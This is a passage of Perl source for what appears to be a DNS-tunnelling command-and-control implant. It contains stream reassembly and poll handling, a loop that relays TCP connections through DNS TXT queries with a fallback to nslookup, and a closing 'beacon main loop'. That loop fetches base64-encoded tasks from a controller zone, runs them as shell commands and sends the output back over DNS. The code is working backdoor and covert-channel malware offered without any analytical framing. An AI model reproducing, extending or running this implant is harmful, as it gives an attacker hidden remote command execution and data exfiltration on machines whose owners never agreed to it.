sub stream_data {                                         # bytes for the target, by offset: any order, repeats harmless
    my ($st, $off, $data) = @_;
    my $end = $off + length $data;
    if ($off > $st->{want}) {
        $st->{dbuf}{$off} = $data if !exists $st->{dbuf}{$off} || length $st->{dbuf}{$off} < length $data;
        $st->{dbuf_since} ||= time;
        return;
    }
    return if $end <= $st->{want};
    $st->{wbuf} .= substr($data, $st->{want} - $off);
    $st->{want} = $end;
    my $again = 1;
    while ($again && %{ $st->{dbuf} }) {
        $again = 0;
        for my $o (sort { $a <=> $b } keys %{ $st->{dbuf} }) {
            last if $o > $st->{want};
            my $d = delete $st->{dbuf}{$o};
            my $e = $o + length $d;
            if ($e > $st->{want}) { $st->{wbuf} .= substr($d, $st->{want} - $o); $st->{want} = $e; $again = 1; last }
        }
    }
    delete $st->{dbuf_since} unless %{ $st->{dbuf} };
    flush_socket($st) unless $st->{connecting};
    finish_stream($st) if defined $st->{closing} && $st->{want} >= $st->{closing};
}

sub handle_poll_response {
    my ($txt) = @_;
    my $had = 0;
    for my $m (split /~/, $txt) {
        next if $m eq '' || $m eq 'N';
        $had = 1;
        my @f = split /\|/, $m, 4;
        if ($f[0] eq 'C' && @f == 4) {
            open_stream($f[1], $f[2], $f[3]);
        } elsif ($f[0] eq 'D' && @f == 4) {
            my $st = $streams{ $f[1] } or next;
            next if $st->{eof};
            stream_data($st, $f[2], decode_base64($f[3]));
        } elsif ($f[0] eq 'X' && @f >= 2) {
            my $st = $streams{ $f[1] } or next;
            if (@f >= 3 && $f[2] =~ /^\d+$/ && $f[2] > $st->{want} && !$st->{eof}) {
                $st->{closing} = $f[2];                   # last bytes still on their way
                $st->{closing_at} = time + $CLOSE_WAIT;
            } else {
                finish_stream($st);
            }
        } elsif ($f[0] eq 'Q') {
            dbg("server said quit: closing " . scalar(keys %streams) . " streams and leaving");
            close_stream($_, 'tunnel stopped') for keys %streams;
            exit 0;
        }
    }
    return $had;
}

sub switch_to_nslookup {
    dbg("switching to nslookup mode");
    $tmode = 'nslookup';
    $cap = 's';
    $sel_r->remove($tudp) if $tudp;
    for my $q (values %pending) {                         # unanswered polls get re-asked by name
        push @stuck, $q->{meta}{n} if $q->{kind} eq 'poll';
    }
    %pending  = ();
    $inflight = 0;
    $polls_inflight = 0;
}

sub on_answer {
    my ($kind, $meta, $ok, $txt) = @_;
    if ($kind eq 'poll') {
        $polls_inflight-- if $polls_inflight > 0;
        if (!$ok) {
            switch_to_nslookup() if !$poll_ok && $tmode eq 'raw' && ++$poll_failures >= 2;
            push @stuck, $meta->{n} if $tmode ne 'raw';  # nslookup mode: ask that answer again by name
            $next_poll = time + 1;
            return;
        }
        $poll_ok = 1;
        delete $pending_reasks{ $meta->{n} };
        if (!$bigtest_sent && $tmode eq 'raw') {
            $bigtest_sent = 1;
            if ($ENV{TUNBIG}) { $cap = 'b' }
            else { send_query(16, "big.$cid.q.$zone", 'bigtest', {}) }
        }
        my $had = 0;
        if ($txt =~ /^#(\d+)~?(.*)$/s) {                # server build order; process strictly in sequence
            my ($bseq, $body) = ($1, $2);
            if ($bseq < $expect_bseq - 10) {            # server restarted: its counter began again
                dbg("poll sequence restarted at $bseq: server restarted, dropping " . scalar(keys %streams) . " streams");
                close_stream($_, 'server restarted') for keys %streams;
                %poll_buf = ();
                $expect_bseq = $bseq;
            }
            $poll_buf{$bseq} = $body if $bseq >= $expect_bseq;
            while (exists $poll_buf{$expect_bseq}) {
                $had = 1 if handle_poll_response(delete $poll_buf{$expect_bseq});
                $expect_bseq++;
                $stuck_since = 0;
            }
            $stuck_since ||= time if %poll_buf;
        } else {
            $had = handle_poll_response($txt);
        }
        $next_poll = time + ($had ? 0 : (%streams ? $BUSY_POLL : $IDLE_POLL));
        return;
    }
    $inflight--;
    if ($kind eq 'bigtest') {
        if ($ok && length($txt) >= 900) { $cap = 'b'; dbg("1000-byte answers arrive: using big answers") }
        else { dbg("big-answer test came back short: staying small") }
        return;
    }
    return if $kind eq 'k';
    my $st = $streams{ $meta->{sid} } or return;
    $st->{unacked}--;
    if (!$ok) { close_stream($meta->{sid}, 'upload gave up'); return }
    close_stream($meta->{sid}, 'all sent after eof') if $st->{eof} && !@{ $st->{q} } && $st->{unacked} == 0;
}

sub housekeeping {                                        # timeouts that must not wedge the tunnel
    my $now = time;
    for my $st (values %streams) {
        if ($st->{connecting} && $now > $st->{connecting}) {
            dbg("stream $st->{sid} connect $st->{host} timed out");
            connect_failed($st);
            next;
        }
        if (defined $st->{closing} && $now > $st->{closing_at}) {
            dbg("stream $st->{sid}: close ordered at $st->{closing} B but only $st->{want} B arrived in ${CLOSE_WAIT}s");
            finish_stream($st, 'close timeout');
            next;
        }
        if ($st->{dbuf_since} && $now - $st->{dbuf_since} > $CLOSE_WAIT && !$st->{eof}) {
            dbg("stream $st->{sid}: gap at $st->{want} B never filled, giving the connection up");
            local_eof($st);
        }
    }
    if ($stuck_since && $now - $stuck_since > $CLOSE_WAIT && %poll_buf) {
        my ($low) = sort { $a <=> $b } keys %poll_buf;
        dbg("answer #$expect_bseq never came although #$low did: skipping ahead");
        $expect_bseq = $low;
        $stuck_since = 0;
        while (exists $poll_buf{$expect_bseq}) { handle_poll_response(delete $poll_buf{$expect_bseq}); $expect_bseq++ }
    }
}

sub tunnel_main {
    $tsuffix = ".$cid.v.$zone";
    ($tmode, $cap, $bigtest_sent) = ('raw', 's', 0);
    %pending = (); %streams = (); %by_fd = (); @ctlq = (); @stuck = ();
    $inflight = 0;
    $sel_r = IO::Select->new;
    $sel_w = IO::Select->new;
    ($pn, $polls_inflight, $next_poll, $poll_ok, $poll_failures) = (int(rand 100000), 0, 0, 0, 0);
    %poll_buf = (); %pending_reasks = ();
    $expect_bseq = 1;
    $stuck_since = 0;
    {   # bytes per upload query: name <= 253, labels <= 63, header up to "u999-99999."
        my $room = 253 - length($tsuffix) - 11;
        my $k = 1;
        $k++ while $room - ($k - 1) > 63 * $k;
        my $chars = $room - ($k - 1);
        $CHUNK = int($chars * 5 / 8);
        $CHUNK -= $CHUNK % 5;
        $CHUNK = 5 if $CHUNK < 5;
    }
    $tudp = undef;
    if ($raw_ip ne '') {
        $tudp = IO::Socket::INET->new(Proto => 'udp', PeerAddr => $raw_ip, PeerPort => $rport);
        $tudp->blocking(0) if $tudp;
    }
    $tmode = 'nslookup' unless $tudp;
    $sel_r->add($tudp) if $tmode eq 'raw';
    dbg("tunnel child $$ starting in $tmode mode, resolver " . ($raw_ip || 'system') . ":$rport, chunk $CHUNK B");

    while (1) {
        $cap = 's' if $tmode ne 'raw';
        my $ahead = ($tmode eq 'raw' && %streams) ? $POLLS_AHEAD : 1;
        if ($polls_inflight < $ahead && time >= $next_poll) {
            $polls_inflight++;
            my ($n, $name) = poll_name();
            my $reasks = $name =~ /\.r(\d+)\./ ? ($pending_reasks{$1} || 0) : 0;
            send_query(16, $name, 'poll', { n => $n, reasks => $reasks });
            $next_poll = time + (%streams ? $BUSY_POLL : $IDLE_POLL);
        }
        while (@ctlq && $inflight < $MAX_INFLIGHT) {
            send_query(1, shift @ctlq, 'k', {});
        }
        for my $sid (sort { $a <=> $b } keys %streams) {
            my $st = $streams{$sid} or next;
            while (@{ $st->{q} } && $inflight < $MAX_INFLIGHT) {
                my $item = shift @{ $st->{q} };
                $st->{unacked}++;
                send_query(1, $item->[0], $item->[1], { sid => $sid });
            }
            if ($streams{$sid} && $st->{paused} && !$st->{eof} && @{ $st->{q} } < $BACKLOG / 2) {
                $st->{paused} = 0;
                $sel_r->add($st->{sock});
            }
        }
        my $wait = $polls_inflight ? 0.05 : $next_poll - time;
        $wait = 0.05 if $wait > 0.05;
        $wait = 0    if $wait < 0;
        my ($rr, $ww) = IO::Select->select($sel_r, $sel_w, undef, $wait);
        for my $fh (@{ $rr || [] }) {
            if ($tudp && $tmode eq 'raw' && fileno($fh) == fileno($tudp)) { raw_pump() }
            else { read_socket($fh) }
        }
        for my $fh (@{ $ww || [] }) {
            my $sid = $by_fd{ fileno $fh };
            my $st = defined $sid ? $streams{$sid} : undef or next;
            if ($st->{connecting}) { connect_done($st) } else { flush_socket($st) }
        }
        housekeeping();
        raw_retry() if $tmode eq 'raw';
    }
}

# ======================================================================
# Beacon main loop
# ======================================================================
raw_open();
dbg("agent $cid starting: " . ($udp ? "raw udp to $raw_ip:$rport" : "nslookup only") . ", poll every $interval s");
my $poll = 0;
while (1) {
    reap_tunnel();
    $poll++;
    my $name = sprintf('%d%04x.%s.v%d%s.t.%s', $poll, int rand 0xffff, $cid, $VERSION, $tunnel_pid ? 't' : '', $zone);
    my ($ok, $task) = query(16, $name, 0);
    if ($ok && defined $task && $task =~ /^(\d+):(.*)$/s) {
        my ($tid, $b64) = ($1, $2);
        my $cmd = decode_base64($b64);
        if ($cmd =~ /^\s*exit\s*$/) { stop_tunnel(); exit 0 }
        my $out = $cmd =~ /^\@/ ? builtin($cmd) : run_cmd($cmd);
        send_output($tid, $out);
        next;                                             # check straight away for the next task
    }
    hsleep($interval);
}
